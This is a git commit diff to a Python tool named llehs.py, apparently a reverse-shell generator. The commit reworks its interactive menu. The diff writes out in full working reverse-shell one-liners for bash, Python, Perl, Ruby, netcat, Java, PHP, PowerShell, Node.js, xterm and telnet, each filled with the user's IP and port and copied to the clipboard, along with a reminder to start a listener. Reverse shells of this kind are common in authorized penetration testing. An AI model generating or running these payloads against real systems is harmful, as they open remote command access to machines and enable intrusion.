86c60ebb56ab2d4f08c7d3609829b70c93e5bfb1
thishelps <skatelme@icloud.com>
2024-03-05 11:11:01 -0500

    worked on trying to make the gen RS better

--- Program/llehs.py
+++ Program/llehs.py
@@ -100,13 +100,13 @@ def listener():
     pass
 
 # Generate reverse shell
-def generate():
+def generate():         # I know the menu is broken trying to fix it and make it easier to use
     port = input("Enter the port number: ")
     ip = socket.gethostbyname(socket.gethostname())
 
     while True:
         print("Your IP address is: " + ip)
-        userVal =input("Is this the IP address you want to use? (y/n)")
+        userVal = input("Is this the IP address you want to use? (y/n)")
         if userVal.lower() == "y":
             break
         elif userVal.lower() == "n":
@@ -118,7 +118,7 @@ def generate():
     
     while True:
         print("Choose category of script:")
-        print("[1] - Our HoemBrew Scripts - recommended")
+        print("[1] - Our HomeBrew Scripts - recommended")
         print("[2] - Linux Basic Scripts")
         print("[3] - Personalized Script")
         userInput = input(": ")
@@ -128,137 +128,133 @@ def generate():
             break
 
         elif userInput == "2":
-            print("Choose a shell script:")
-            print("[1] - Bash")
-            print("[2] - Python")
-            print("[3] - Perl")
-            print("[4] - Ruby")
-            print("[5] - Netcat")
-            print("[6] - Java")
-            print("[7] - PHP")
-            print("[8] - Powershell")
-            print("[9] - Node.js")
-            print("[10] - xterm")
-            print("[12] - telnet")
-    
-            userInput = input(": ")
+            while True:
+                print("Choose a shell script:")
+                print("[1] - Bash")
+                print("[2] - Python")
+                print("[3] - Perl")
+                print("[4] - Ruby")
+                print("[5] - Netcat")
+                print("[6] - Java")
+                print("[7] - PHP")
+                print("[8] - Powershell")
+                print("[9] - Node.js")
+                print("[10] - xterm")
+                print("[12] - telnet")
+        
+                userInput = input(": ")
 
-            if userInput == "1" or userInput.lower() == "bash":
-                currentScript = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
-                print("\n" + currentScript + "\n" )
+                if userInput == "1" or userInput.lower() == "bash":
+                    currentScript = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript) # copies the script to the clipboard
+                    pyperclip.copy(currentScript) # copies the script to the clipboard
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
-            
-            elif userInput == "2" or userInput.lower() == "python":
-                currentScript = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \n"
-                print("\n" + currentScript + "\n" )
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
+                
+                elif userInput == "2" or userInput.lower() == "python":
+                    currentScript = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "3" or userInput.lower() == "perl":
-                currentScript = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' \n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "3" or userInput.lower() == "perl":
+                    currentScript = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "4" or userInput.lower() == "ruby":
-                currentScript = "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' \n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "4" or userInput.lower() == "ruby":
+                    currentScript = "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "5" or userInput.lower() == "netcat":
-                currentScript = "nc -e /bin/sh " + ip + " " + port + "\n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "5" or userInput.lower() == "netcat":
+                    currentScript = "nc -e /bin/sh " + ip + " " + port + "\n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "6" or userInput.lower() == "java":
-                currentScript = "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor() \n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "6" or userInput.lower() == "java":
+                    currentScript = "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor() \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "7" or userInput.lower() == "php":
-                currentScript = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' \n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "7" or userInput.lower() == "php":
+                    currentScript = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "8" or userInput.lower() == "powershell":
-                currentScript = "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" \n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "8" or userInput.lower() == "powershell":
+                    currentScript = "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "9" or userInput.lower() == "node.js":
-                currentScript = "node -e 'var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/sh\"), client = new net.Socket();client.connect(" + port + ", \"" + ip + "\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});' \n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "9" or userInput.lower() == "node.js":
+                    currentScript = "node -e 'var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/sh\"), client = new net.Socket();client.connect(" + port + ", \"" + ip + "\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});' \n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "10" or userInput.lower() == "xterm":
-                currentScript = "xterm -display " + ip + ":" + port + "\n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "10" or userInput.lower() == "xterm":
+                    currentScript = "xterm -display " + ip + ":" + port + "\n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            elif userInput == "11" or userInput.lower() == "telnet":
-                currentScript = "telnet " + ip + " " + port + " | /bin/bash | telnet " + ip + " " + port + "\n"
-                print("\n" + currentScript + "\n" )
+                elif userInput == "11" or userInput.lower() == "telnet":
+                    currentScript = "telnet " + ip + " " + port + " | /bin/bash | telnet " + ip + " " + port + "\n"
+                    print("\n" + currentScript + "\n" )
 
-                pyperclip.copy(currentScript)
+                    pyperclip.copy(currentScript)
 
-                print("Script copied to clipboard!")
-                print("Message: Make sure to have a listener running on the specified port.")
-                break
+                    print("Script copied to clipboard!")
+                    print("Message: Make sure to have a listener running on the specified port.")
 
-            else:
-                print("Invalid choice")
-                continue
+                else:
+                    print("Invalid choice")
+                    continue
+
+                exit = input("Press enter to list scripts again or enter 0 for main menu: ")
+                if exit == "0":
+                    break
+                else:
+                    continue
 
         elif userInput == "3": # Could not be possible, still working on it
-            print("Please chose one of the following:")
+            print("Please choose one of the following:")
             print("[1] - Upload a script")
             print("[2] - Write a script")
 
